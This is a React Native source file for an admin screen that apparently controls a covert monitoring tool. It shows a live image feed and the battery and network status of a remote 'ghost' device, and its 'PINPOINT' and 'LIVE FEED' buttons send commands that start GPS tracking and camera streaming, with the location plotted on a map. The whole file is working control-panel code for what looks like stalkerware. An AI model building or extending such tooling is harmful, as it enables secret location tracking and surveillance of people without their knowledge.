import React, { useState, useEffect } from 'react';
import { View, Text, Image, TouchableOpacity, StyleSheet } from 'react-native';
import MapView, { Marker, PROVIDER_GOOGLE } from 'react-native-maps';

export default function AdminScreen({ socket, onLogout }) {
    const [frame, setFrame] = useState(null);
    const [status, setStatus] = useState({ battery: 0, netType: '...' });
    const [pinpointActive, setPinpointActive] = useState(false);
    const [location, setLocation] = useState(null);

    useEffect(() => {
        socket.on('stream', (img) => setFrame(`data:image/jpeg;base64,${img}`));
        socket.on('ghost_status', (data) => setStatus(data));
        
        socket.on('update_list', (packet) => {
            if (packet.type === 'gps' && packet.coords) {
                setLocation({
                    latitude: packet.coords.latitude,
                    longitude: packet.coords.longitude,
                    latitudeDelta: 0.005,
                    longitudeDelta: 0.005,
                });
            }
        });

        socket.on('admin_command', (cmd) => {
            if (cmd === 'START_PINPOINT') setPinpointActive(true);
            if (cmd === 'STOP_PINPOINT') setPinpointActive(false);
        });

        return () => {
            socket.off('stream');
            socket.off('ghost_status');
            socket.off('admin_command');
        };
    }, []);

    const getStatusColor = (val) => {
        if (val > 50) return '#0F0';
        if (val > 20) return '#FF0';
        return '#F00';
    };

    return (
        <View style={styles.container}>
            {/* TACTICAL HEADER */}
            <View style={styles.header}>
                <View style={styles.statBox}>
                    <Text style={styles.label}>GHOST POWER</Text>
                    <View style={styles.row}>
                        <View style={[styles.dot, { backgroundColor: getStatusColor(status.battery) }]} />
                        <Text style={[styles.val, { color: getStatusColor(status.battery) }]}>{status.battery}%</Text>
                    </View>
                </View>
                <View style={styles.statBox}>
                    <Text style={styles.label}>SIGNAL</Text>
                    <Text style={styles.val}>{status.netType}</Text>
                </View>
            </View>

            {/* MONITOR AREA */}
            <View style={styles.monitor}>
                {pinpointActive && location ? (
                    <MapView provider={PROVIDER_GOOGLE} style={styles.map} region={location} customMapStyle={darkMap}>
                        <Marker coordinate={location} />
                    </MapView>
                ) : frame ? (
                    <Image source={{ uri: frame }} style={styles.stream} resizeMode="contain" />
                ) : (
                    <Text style={styles.placeholder}>AWAITING FEED...</Text>
                )}
            </View>

            {/* CONTROLS */}
            <View style={styles.controls}>
                <TouchableOpacity style={[styles.btn, pinpointActive && styles.btnActive]} onPress={() => socket.emit('admin_command', pinpointActive ? 'STOP_PINPOINT' : 'START_PINPOINT')}>
                    <Text style={styles.btnTxt}>{pinpointActive ? "STOP GPS" : "PINPOINT"}</Text>
                </TouchableOpacity>
                <TouchableOpacity style={styles.btn} onPress={() => socket.emit('admin_command', 'START_LIVE')}>
                    <Text style={styles.btnTxt}>LIVE FEED</Text>
                </TouchableOpacity>
                <TouchableOpacity style={styles.exitBtn} onPress={onLogout}>
                    <Text style={styles.btnTxt}>LOGOUT</Text>
                </TouchableOpacity>
            </View>
        </View>
    );
}

const darkMap = [{ "elementType": "geometry", "stylers": [{ "color": "#212121" }] }, { "elementType": "labels.text.fill", "stylers": [{ "color": "#757575" }] }];

const styles = StyleSheet.create({
    container: { flex: 1, backgroundColor: '#000' },
    header: { height: 80, flexDirection: 'row', borderBottomWidth: 1, borderColor: '#222', padding: 10 },
    statBox: { flex: 1, alignItems: 'center' },
    label: { color: '#444', fontSize: 10, fontWeight: 'bold' },
    row: { flexDirection: 'row', alignItems: 'center', marginTop: 5 },
    dot: { width: 8, height: 8, borderRadius: 4, marginRight: 8 },
    val: { fontSize: 18, fontWeight: 'bold', color: '#FFF' },
    monitor: { flex: 1, backgroundColor: '#050505', justifyContent: 'center' },
    stream: { width: '100%', height: '100%' },
    map: { width: '100%', height: '100%' },
    placeholder: { color: '#222', fontSize: 12, textAlign: 'center' },
    controls: { height: 100, flexDirection: 'row', justifyContent: 'space-around', alignItems: 'center' },
    btn: { padding: 15, backgroundColor: '#111', borderRadius: 5, minWidth: 100, alignItems: 'center' },
    btnActive: { borderColor: '#0F0', borderWidth: 1 },
    exitBtn: { padding: 15, backgroundColor: '#200', borderRadius: 5 },
    btnTxt: { color: '#FFF', fontWeight: 'bold', fontSize: 10 }
});
